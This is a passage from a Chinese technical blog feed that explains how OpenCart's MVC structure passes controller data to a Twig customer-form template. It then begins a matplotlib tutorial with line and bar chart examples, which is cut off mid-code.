class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;request-&gt;get[<span class="string">'customer_id'</span>])) &#123;</span><br><span class="line">$data[<span class="string">'action'</span>] = <span class="keyword">$this</span>-&gt;url-&gt;link(<span class="string">'customer/customer/add'</span>, <span class="string">'user_token='</span> . <span class="keyword">$this</span>-&gt;session-&gt;data[<span class="string">'user_token'</span>] . $url);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">$data[<span class="string">'action'</span>] = <span class="keyword">$this</span>-&gt;url-&gt;link(<span class="string">'customer/customer/edit'</span>, <span class="string">'user_token='</span> . <span class="keyword">$this</span>-&gt;session-&gt;data[<span class="string">'user_token'</span>] . <span class="string">'&amp;customer_id='</span> . <span class="keyword">$this</span>-&gt;request-&gt;get[<span class="string">'customer_id'</span>] . $url);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$data[<span class="string">'cancel'</span>] = <span class="keyword">$this</span>-&gt;url-&gt;link(<span class="string">'customer/customer'</span>, <span class="string">'user_token='</span> . <span class="keyword">$this</span>-&gt;session-&gt;data[<span class="string">'user_token'</span>] . $url);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;request-&gt;get[<span class="string">'customer_id'</span>]) &amp;&amp; (<span class="keyword">$this</span>-&gt;request-&gt;server[<span class="string">'REQUEST_METHOD'</span>] != <span class="string">'POST'</span>)) &#123;</span><br><span class="line">$customer_info = <span class="keyword">$this</span>-&gt;model_customer_customer-&gt;getCustomer(<span class="keyword">$this</span>-&gt;request-&gt;get[<span class="string">'customer_id'</span>]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">$this</span>-&gt;load-&gt;model(<span class="string">'customer/customer_group'</span>);</span><br><span class="line"></span><br><span class="line">$data[<span class="string">'customer_groups'</span>] = <span class="keyword">$this</span>-&gt;model_customer_customer_group-&gt;getCustomerGroups();</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;request-&gt;post[<span class="string">'customer_group_id'</span>])) &#123;</span><br><span class="line">$data[<span class="string">'customer_group_id'</span>] = <span class="keyword">$this</span>-&gt;request-&gt;post[<span class="string">'customer_group_id'</span>];</span><br><span class="line">&#125; <span class="keyword">elseif</span> (!<span class="keyword">empty</span>($customer_info)) &#123;</span><br><span class="line">$data[<span class="string">'customer_group_id'</span>] = $customer_info[<span class="string">'customer_group_id'</span>];</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">$data[<span class="string">'customer_group_id'</span>] = <span class="keyword">$this</span>-&gt;config-&gt;get(<span class="string">'config_customer_group_id'</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;request-&gt;post[<span class="string">'firstname'</span>])) &#123;</span><br><span class="line">$data[<span class="string">'firstname'</span>] = <span class="keyword">$this</span>-&gt;request-&gt;post[<span class="string">'firstname'</span>];</span><br><span class="line">&#125; <span class="keyword">elseif</span> (!<span class="keyword">empty</span>($customer_info)) &#123;</span><br><span class="line">$data[<span class="string">'firstname'</span>] = $customer_info[<span class="string">'firstname'</span>];</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">$data[<span class="string">'firstname'</span>] = <span class="string">''</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;request-&gt;post[<span class="string">'lastname'</span>])) &#123;</span><br><span class="line">$data[<span class="string">'lastname'</span>] = <span class="keyword">$this</span>-&gt;request-&gt;post[<span class="string">'lastname'</span>];</span><br><span class="line">&#125; <span class="keyword">elseif</span> (!<span class="keyword">empty</span>($customer_info)) &#123;</span><br><span class="line">$data[<span class="string">'lastname'</span>] = $customer_info[<span class="string">'lastname'</span>];</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">$data[<span class="string">'lastname'</span>] = <span class="string">''</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;request-&gt;post[<span class="string">'email'</span>])) &#123;</span><br><span class="line">$data[<span class="string">'email'</span>] = <span class="keyword">$this</span>-&gt;request-&gt;post[<span class="string">'email'</span>];</span><br><span class="line">&#125; <span class="keyword">elseif</span> (!<span class="keyword">empty</span>($customer_info)) &#123;</span><br><span class="line">$data[<span class="string">'email'</span>] = $customer_info[<span class="string">'email'</span>];</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">$data[<span class="string">'email'</span>] = <span class="string">''</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;request-&gt;post[<span class="string">'telephone'</span>])) &#123;</span><br><span class="line">$data[<span class="string">'telephone'</span>] = <span class="keyword">$this</span>-&gt;request-&gt;post[<span class="string">'telephone'</span>];</span><br><span class="line">&#125; <span class="keyword">elseif</span> (!<span class="keyword">empty</span>($customer_info)) &#123;</span><br><span class="line">$data[<span class="string">'telephone'</span>] = $customer_info[<span class="string">'telephone'</span>];</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">$data[<span class="string">'telephone'</span>] = <span class="string">''</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Custom Fields</span></span><br><span class="line"><span class="keyword">$this</span>-&gt;load-&gt;model(<span class="string">'customer/custom_field'</span>);</span><br><span class="line"></span><br><span class="line">$data[<span class="string">'custom_fields'</span>] = <span class="keyword">array</span>();</span><br><span class="line"></span><br><span class="line">$filter_data = <span class="keyword">array</span>(</span><br><span class="line"><span class="string">'sort'</span>  =&gt; <span class="string">'cf.sort_order'</span>,</span><br><span class="line"><span class="string">'order'</span> =&gt; <span class="string">'ASC'</span></span><br><span class="line">);</span><br><span class="line"></span><br><span class="line">$custom_fields = <span class="keyword">$this</span>-&gt;model_customer_custom_field-&gt;getCustomFields($filter_data);</span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span> ($custom_fields <span class="keyword">as</span> $custom_field) &#123;</span><br><span class="line">$data[<span class="string">'custom_fields'</span>][] = <span class="keyword">array</span>(</span><br><span class="line"><span class="string">'custom_field_id'</span>    =&gt; $custom_field[<span class="string">'custom_field_id'</span>],</span><br><span class="line"><span class="string">'custom_field_value'</span> =&gt; <span class="keyword">$this</span>-&gt;model_customer_custom_field-&gt;getCustomFieldValues($custom_field[<span class="string">'custom_field_id'</span>]),</span><br><span class="line"><span class="string">'name'</span>               =&gt; $custom_field[<span class="string">'name'</span>],</span><br><span class="line"><span class="string">'value'</span>              =&gt; $custom_field[<span class="string">'value'</span>],</span><br><span class="line"><span class="string">'type'</span>               =&gt; $custom_field[<span class="string">'type'</span>],</span><br><span class="line"><span class="string">'location'</span>           =&gt; $custom_field[<span class="string">'location'</span>],</span><br><span class="line"><span class="string">'sort_order'</span>         =&gt; $custom_field[<span class="string">'sort_order'</span>]</span><br><span class="line">);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;request-&gt;post[<span class="string">'custom_field'</span>])) &#123;</span><br><span class="line">$data[<span class="string">'account_custom_field'</span>] = <span class="keyword">$this</span>-&gt;request-&gt;post[<span class="string">'custom_field'</span>];</span><br><span class="line">&#125; <span class="keyword">elseif</span> (!<span class="keyword">empty</span>($customer_info)) &#123;</span><br><span class="line">$data[<span class="string">'account_custom_field'</span>] = json_decode($customer_info[<span class="string">'custom_field'</span>], <span class="keyword">true</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">$data[<span class="string">'account_custom_field'</span>] = <span class="keyword">array</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;request-&gt;post[<span class="string">'newsletter'</span>])) &#123;</span><br><span class="line">$data[<span class="string">'newsletter'</span>] = <span class="keyword">$this</span>-&gt;request-&gt;post[<span class="string">'newsletter'</span>];</span><br><span class="line">&#125; <span class="keyword">elseif</span> (!<span class="keyword">empty</span>($customer_info)) &#123;</span><br><span class="line">$data[<span class="string">'newsletter'</span>] = $customer_info[<span class="string">'newsletter'</span>];</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">$data[<span class="string">'newsletter'</span>] = <span class="string">''</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;request-&gt;post[<span class="string">'status'</span>])) &#123;</span><br><span class="line">$data[<span class="string">'status'</span>] = <span class="keyword">$this</span>-&gt;request-&gt;post[<span class="string">'status'</span>];</span><br><span class="line">&#125; <span class="keyword">elseif</span> (!<span class="keyword">empty</span>($customer_info)) &#123;</span><br><span class="line">$data[<span class="string">'status'</span>] = $customer_info[<span class="string">'status'</span>];</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">$data[<span class="string">'status'</span>] = <span class="keyword">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;request-&gt;post[<span class="string">'safe'</span>])) &#123;</span><br><span class="line">$data[<span class="string">'safe'</span>] = <span class="keyword">$this</span>-&gt;request-&gt;post[<span class="string">'safe'</span>];</span><br><span class="line">&#125; <span class="keyword">elseif</span> (!<span class="keyword">empty</span>($customer_info)) &#123;</span><br><span class="line">$data[<span class="string">'safe'</span>] = $customer_info[<span class="string">'safe'</span>];</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">$data[<span class="string">'safe'</span>] = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;request-&gt;post[<span class="string">'password'</span>])) &#123;</span><br><span class="line">$data[<span class="string">'password'</span>] = <span class="keyword">$this</span>-&gt;request-&gt;post[<span class="string">'password'</span>];</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">$data[<span class="string">'password'</span>] = <span class="string">''</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;request-&gt;post[<span class="string">'confirm'</span>])) &#123;</span><br><span class="line">$data[<span class="string">'confirm'</span>] = <span class="keyword">$this</span>-&gt;request-&gt;post[<span class="string">'confirm'</span>];</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">$data[<span class="string">'confirm'</span>] = <span class="string">''</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">$this</span>-&gt;load-&gt;model(<span class="string">'localisation/country'</span>);</span><br><span class="line"></span><br><span class="line">$data[<span class="string">'countries'</span>] = <span class="keyword">$this</span>-&gt;model_localisation_country-&gt;getCountries();</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;request-&gt;post[<span class="string">'address'</span>])) &#123;</span><br><span class="line">$data[<span class="string">'addresses'</span>] = <span class="keyword">$this</span>-&gt;request-&gt;post[<span class="string">'address'</span>];</span><br><span class="line">&#125; <span class="keyword">elseif</span> (<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;request-&gt;get[<span class="string">'customer_id'</span>])) &#123;</span><br><span class="line">$data[<span class="string">'addresses'</span>] = <span class="keyword">$this</span>-&gt;model_customer_customer-&gt;getAddresses(<span class="keyword">$this</span>-&gt;request-&gt;get[<span class="string">'customer_id'</span>]);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">$data[<span class="string">'addresses'</span>] = <span class="keyword">array</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;request-&gt;post[<span class="string">'default'</span>])) &#123;</span><br><span class="line">$data[<span class="string">'default'</span>] = <span class="keyword">$this</span>-&gt;request-&gt;post[<span class="string">'default'</span>];</span><br><span class="line">&#125; <span class="keyword">elseif</span> (!<span class="keyword">empty</span>($customer_info)) &#123;</span><br><span class="line">$data[<span class="string">'default'</span>] = array_search($customer_info[<span class="string">'address_id'</span>], array_column($data[<span class="string">'addresses'</span>], <span class="string">'address_id'</span>));</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">$data[<span class="string">'default'</span>] = <span class="string">''</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$data[<span class="string">'header'</span>] = <span class="keyword">$this</span>-&gt;load-&gt;controller(<span class="string">'common/header'</span>);</span><br><span class="line">$data[<span class="string">'column_left'</span>] = <span class="keyword">$this</span>-&gt;load-&gt;controller(<span class="string">'common/column_left'</span>);</span><br><span class="line">$data[<span class="string">'footer'</span>] = <span class="keyword">$this</span>-&gt;load-&gt;controller(<span class="string">'common/footer'</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">$this</span>-&gt;response-&gt;setOutput(<span class="keyword">$this</span>-&gt;load-&gt;view(<span class="string">'customer/customer_form'</span>, $data));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>其实这个部分就是把前台View需要用到的事先约定的一些变量名，通过$data字典的形式传递，所有的这些$data字典的key值要么直接来自于post，get请求或者请求头，要么来自于数据库查询，要么来自业务自定义。最后通过$this-&gt;load-&gt;view(‘customer/customer_form’, $data)传递给前台View,从而继续进行渲染。紧接着我们来一窥customer/customer_form:</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123; header &#125;&#125;&#123;&#123; column_left &#125;&#125;</span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"content"</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"page-header"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"container-fluid"</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"float-right"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">button</span> <span class="attr">type</span>=<span class="string">"submit"</span> <span class="attr">form</span>=<span class="string">"form-customer"</span> <span class="attr">data-toggle</span>=<span class="string">"tooltip"</span> <span class="attr">title</span>=<span class="string">"&#123;&#123; button_save &#125;&#125;"</span> <span class="attr">class</span>=<span class="string">"btn btn-primary"</span>&gt;</span><span class="tag">&lt;<span class="name">i</span> <span class="attr">class</span>=<span class="string">"fas fa-save"</span>&gt;</span><span class="tag">&lt;/<span class="name">i</span>&gt;</span><span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"&#123;&#123; cancel &#125;&#125;"</span> <span class="attr">data-toggle</span>=<span class="string">"tooltip"</span> <span class="attr">title</span>=<span class="string">"&#123;&#123; button_cancel &#125;&#125;"</span> <span class="attr">class</span>=<span class="string">"btn btn-light"</span>&gt;</span><span class="tag">&lt;<span class="name">i</span> <span class="attr">class</span>=<span class="string">"fas fa-reply"</span>&gt;</span><span class="tag">&lt;/<span class="name">i</span>&gt;</span><span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">h1</span>&gt;</span>&#123;&#123; heading_title &#125;&#125;<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">ol</span> <span class="attr">class</span>=<span class="string">"breadcrumb"</span>&gt;</span></span><br><span class="line">        &#123;% for breadcrumb in breadcrumbs %&#125;</span><br><span class="line">          <span class="tag">&lt;<span class="name">li</span> <span class="attr">class</span>=<span class="string">"breadcrumb-item"</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"&#123;&#123; breadcrumb.href &#125;&#125;"</span>&gt;</span>&#123;&#123; breadcrumb.text &#125;&#125;<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">        &#123;% endfor %&#125;</span><br><span class="line">      <span class="tag">&lt;/<span class="name">ol</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"container-fluid"</span>&gt;</span></span><br><span class="line">    &#123;% if error_warning %&#125;</span><br><span class="line">      <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"alert alert-danger alert-dismissible"</span>&gt;</span><span class="tag">&lt;<span class="name">i</span> <span class="attr">class</span>=<span class="string">"fas fa-exclamation-circle"</span>&gt;</span><span class="tag">&lt;/<span class="name">i</span>&gt;</span> &#123;&#123; error_warning &#125;&#125;</span><br><span class="line">        <span class="tag">&lt;<span class="name">button</span> <span class="attr">type</span>=<span class="string">"button"</span> <span class="attr">class</span>=<span class="string">"close"</span> <span class="attr">data-dismiss</span>=<span class="string">"alert"</span>&gt;</span>&amp;times;<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    &#123;% endif %&#125;</span><br><span class="line">......(此处省略N多行)</span><br></pre></td></tr></table></figure><p>可以看到上面的twig前端语言基本双大括号里面的变量就是我们$data变量的key值，同样twig模板一些命令控制语句，可以用来减少html代码的编写量和处理简单的output逻辑，剩下的基本就是html的标签，就是普通的html文本。最后通过渲染引擎呈现给客户端。我们按下保存可以看到返回的界面如下；<br><img src="/myimages/MVC/success.jpg" alt="image"></p><p>红圈是我们这次的处理逻辑按钮，蓝色圈的按钮是和本次处理逻辑类似的连个业务，而黑色圈的语句就是调用了language模块返回的语句，可以参考上面的admin/language/customer/customer/customer.php language文件。</p><h1 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h1><p>这是一篇总结自己学习MVC的不成熟笔记，主要以opencart为例，很多细节仍旧没有涉及，相关的理解或许仍旧有不到位的地方。今后会专门学习几个MVC的web框架来增强自己的理解和提升自己的架构能力。在这个分析的过程中逐渐有点理解到框架的力量和架构好的代码大致是个什么样子，ok,路还很长，且行且珍惜！</p>]]></content>
      
      
      
        <tags>
            
            <tag> php </tag>
            
            <tag> MVC </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>python matplotlib 画图</title>
      <link href="/2018/12/05/python-matplotlib-%E7%94%BB%E5%9B%BE/"/>
      <url>/2018/12/05/python-matplotlib-%E7%94%BB%E5%9B%BE/</url>
      
        <content type="html"><![CDATA[<h1 id="常规操作"><a href="#常规操作" class="headerlink" title="常规操作"></a>常规操作</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> matplotlib.pyplot <span class="keyword">as</span> plt</span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">plt.rcParams[<span class="string">'font.sans-serif'</span>]=[<span class="string">'SimHei'</span>] <span class="comment">#用来正常显示中文标签</span></span><br><span class="line">plt.rcParams[<span class="string">'axes.unicode_minus'</span>]=<span class="keyword">False</span> <span class="comment">#用来正常显示负号</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#绘图数据生成</span></span><br><span class="line">x = np.linspace(<span class="number">-10</span>,<span class="number">10</span>,<span class="number">1000</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 设置整体画布样式,可使用print(plt.style.available)</span></span><br><span class="line"><span class="comment">#plt.style.use('ggplot')</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#定制化线条样式和颜色,参数名可以全程也可以缩写，如linestyle==ls;lineweight==lw......</span></span><br><span class="line">plt.plot(x,np.cos(x),ls=<span class="string">'-'</span>,color=<span class="string">"#000000"</span>,label=<span class="string">"cos(x)"</span>)</span><br><span class="line">plt.plot(x,np.sin(x),ls=<span class="string">':'</span>,color=<span class="string">"r"</span>,label=<span class="string">"sin(x)"</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#设置显示标注的位置</span></span><br><span class="line">plt.legend(loc=<span class="string">'best'</span>,title=<span class="string">'图例'</span>)    </span><br><span class="line"></span><br><span class="line"><span class="comment">#设置x,y轴的标注范围</span></span><br><span class="line">plt.xlim([<span class="number">0</span>,<span class="number">10</span>])                            </span><br><span class="line">plt.ylim(<span class="number">-1</span>,<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#设置x,y轴的label以及边框美化,注意到字符串支持letax语法</span></span><br><span class="line">box=dict(facecolor=<span class="string">'#6959CD'</span>,pad=<span class="number">2</span>,alpha=<span class="number">.4</span>)</span><br><span class="line">plt.xlabel(<span class="string">"$x$"</span>,fontsize=<span class="number">20</span>,bbox=box)                            </span><br><span class="line">plt.ylabel(<span class="string">"$y=sin(x) or cos(x)$"</span>,fontsize=<span class="number">20</span>,bbox=box)   </span><br><span class="line"></span><br><span class="line"><span class="comment">#设置网格线</span></span><br><span class="line">plt.grid(c=<span class="string">"gray"</span>,ls=<span class="string">':'</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#绘制参考基准线，垂直于x轴或者垂直于y轴</span></span><br><span class="line">plt.axhline(<span class="number">0.25</span>,ls=<span class="string">'-'</span>,lw=<span class="number">2</span>,c=<span class="string">'y'</span>)</span><br><span class="line">plt.axvline(<span class="number">4</span>,ls=<span class="string">'-'</span>,lw=<span class="number">2</span>,c=<span class="string">'y'</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#绘制参考区域</span></span><br><span class="line">plt.axvspan(xmin=<span class="number">6</span>,xmax=<span class="number">8</span>,facecolor=<span class="string">'gray'</span>,alpha=<span class="number">.6</span>)</span><br><span class="line">plt.axhspan(ymin=<span class="number">-0.5</span>,ymax=<span class="number">0</span>,facecolor=<span class="string">'gray'</span>,alpha=<span class="number">.6</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#添加无指向性文本</span></span><br><span class="line">plt.text(<span class="number">2.8</span>,<span class="number">0.25</span>,<span class="string">"无指向"</span>,color=<span class="string">'r'</span>,bbox=box)</span><br><span class="line"><span class="comment">#添加指向性文本,注意到arrowprops指示被注释内容的箭头的属性字典</span></span><br><span class="line">plt.annotate(<span class="string">"max--有指向"</span>,xy=(np.pi/<span class="number">2</span>,<span class="number">1</span>),xytext=(<span class="number">3</span>,<span class="number">0.75</span>),color=<span class="string">'b'</span>,bbox=box,arrowprops=dict(arrowstyle=<span class="string">'-&gt;'</span>,connectionstyle=<span class="string">'arc3'</span>,color=<span class="string">'b'</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#添加文章标题</span></span><br><span class="line">plt.rcParams[<span class="string">'font.sans-serif'</span>]=[<span class="string">'SimHei'</span>] <span class="comment">#用来正常显示中文标签</span></span><br><span class="line">plt.rcParams[<span class="string">'axes.unicode_minus'</span>]=<span class="keyword">False</span> <span class="comment">#用来正常显示负号</span></span><br><span class="line">plt.title(<span class="string">"plot类常规作图"</span>)</span><br><span class="line">plt.show()</span><br></pre></td></tr></table></figure><a id="more"></a><p><img src="myimages/python matplotlib 画图/output_1_0.png" alt="png"></p><h1 id="常用的绘图类型"><a href="#常用的绘图类型" class="headerlink" title="常用的绘图类型"></a>常用的绘图类型</h1><h2 id="柱状图"><a href="#柱状图" class="headerlink" title="柱状图"></a>柱状图</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 柱状图</span></span><br><span class="line">x=[<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>]</span><br><span class="line">y=[<span class="number">3</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">9</span>]</span><br><span class="line"></span><br><span class="line">plt.style.use(<span class="string">'ggplot'</span>)</span><br><span class="line">plt.bar(x,y,align=<span class="string">'center'</span>,color=<span class="string">'red'</span>,tick_label=[<span class="string">"类1"</span>,<span class="string">'类2'</span>,<span class="string">'类3'</span>,<span class="string">'类4'</span>,<span class="string">'类5'</span>,<span class="string">'类6'</span>])</span><br><span class="line">plt.xlabel(<span class="string">"类别"</span>)</span><br><span class="line">plt.ylabel(<span class="string">"质量/kg"</span>)</span><br><span class="line">plt.show()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#堆叠柱状图</span></span><br><span class="line">name_list = [<span class="string">'Monday'</span>,<span class="string">'Tuesday'</span>,<span class="string">'Friday'</span>,<span class="string">'Sunday'</span>]</span><br><span class="line">num_list = [<span class="number">1.5</span>,<span class="number">0.6</span>,<span class="number">7.8</span>,<span class="number">6</span>]</span><br><span class="line">num_list1 = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">1</span>]</span><br><span class="line">plt.bar(range(len(num_list)), num_list, label=<span class="string">'boy'</span>,fc = <span class="string">'y'</span>)</span><br><span class="line">plt.bar(range(len(num_list)), num_list1, bottom=num_list, label=<span class="string">'girl'</span>,tick_label = name_list,fc = <span class="string">'r'</span>)</span><br><span class="line">plt.legend()</span><br><span class="line">plt.show()</span><br></pre></td></tr></table></figure><p><img src="myimages/python matplotlib 画图/output_4_0.png" alt="png"></p><p><img src="myimages/python matplotlib 画图/output_4_1.png" alt="png"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">x</span></span><br><span class="line"><span class="string">包含所有柱子的下标的列表</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">height</span></span><br><span class="line"><span 